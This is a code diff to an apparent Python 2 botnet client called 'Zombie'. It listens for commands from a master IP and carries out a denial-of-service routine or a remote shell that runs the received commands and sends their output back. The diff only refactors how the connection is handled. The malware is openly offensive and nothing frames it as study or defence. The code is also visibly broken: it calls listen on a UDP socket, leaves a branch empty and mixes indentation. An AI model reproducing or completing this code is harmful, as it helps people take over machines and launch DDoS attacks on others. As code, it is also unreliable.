@@ -5,8 +5,8 @@ import subprocess
 
 class Zombie:
 
-	def __init__(self):
-
+	def __init__(self,conn):
+		self.conn = conn
 
 
 	#Denial of Service Attack
@@ -27,14 +27,14 @@ class Zombie:
 		sock.close()													#Close socket
 
 	#Reverse Shell
-	def reverse_shell(self,conn):
+	def reverse_shell(self):
 
-		conn.sendall("Starting reverse shell...\n")
+		self.conn.sendall("Starting reverse shell...\n")
 
 		while True:
-			cmd = conn.recv(1024)				#Receive shell command
+			cmd = self.conn.recv(1024)				#Receive shell command
 			if cmd == 'exit':					#Break if user wished to exit
-				conn.sendall("Exiting...\n")
+				self.conn.sendall("Exiting...\n")
 				break
 
 			# do shell command
@@ -42,12 +42,12 @@ class Zombie:
             # read output
             stdout_value = new_process.stdout.read() + new_process.stderr.read()
             # send back output
-            conn.sendall(stdout_value)
+            self.conn.sendall(stdout_value)
 
 
-	def parse_cmd(self,conn):
-		packet = conn.recv(1024)
-		packet = packet.split('\r\n')
+	def parse_cmd(self,p):
+		# packet = conn.recv(1024)
+		packet = p.split('\r\n')
 
 		#packet = "DDOS\r\nDEST_IP\r\nDEST_PORT\r\n"
 		if packet[0] == "DDOS":
@@ -56,12 +56,13 @@ class Zombie:
 		elif packet[0] == "SPAM":
 
 
+		#packet  = "RVSH\r\n"
 		elif packet[0] == "RVSH":
-			conn.sendall("RVSH\n")				#Tell master to start sending commands
-			self.reverse_shell(conn)
+			self.conn.sendall("RVSH\n")				#Tell master to start sending commands
+			self.reverse_shell()
 
 
-		conn.close()
+		# conn.close()
 
 
 
@@ -74,13 +75,12 @@ class Zombie:
 if __name__ == '__main__':
 
 	MASTER_IP = "127.0.0.1"
-
-	zomb = Zombie()
+	MASTER_PORT = 6000
 
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
-		# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
-		s.bind(("",6000))											#Bind to port
+		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
+		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
 		s.listen(5)													#Listen 
 		print 'Socket created'
 	except socket.error, msg :
@@ -88,16 +88,18 @@ if __name__ == '__main__':
 	    sys.exit()
 
 	
+	zomb = Zombie(s)
 	while True:
-		# data, addr = s.recvfrom(1024)
-		# print "reveived: " + data + " from: " + addr
-		conn, addr = s.accept()
+		#Receive command
+		data, addr = zomb.conn.recvfrom(1024)
+		print "reveived: " + data + " from: " + addr
+		# conn, addr = s.accept()
 		if addr == MASTER_IP:
 			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
-    		start_new_thread(zomb.parse_cmd ,(conn,))
-    	else:
-    		conn.close()
+    		# start_new_thread(zomb.parse_cmd ,(conn,))
+    		start_new_thread(zomb.parse_cmd ,(data,))
+    	# else:
+    	# 	conn.close()
 
 
-
-    s.close()
+    zomb.conn.close()
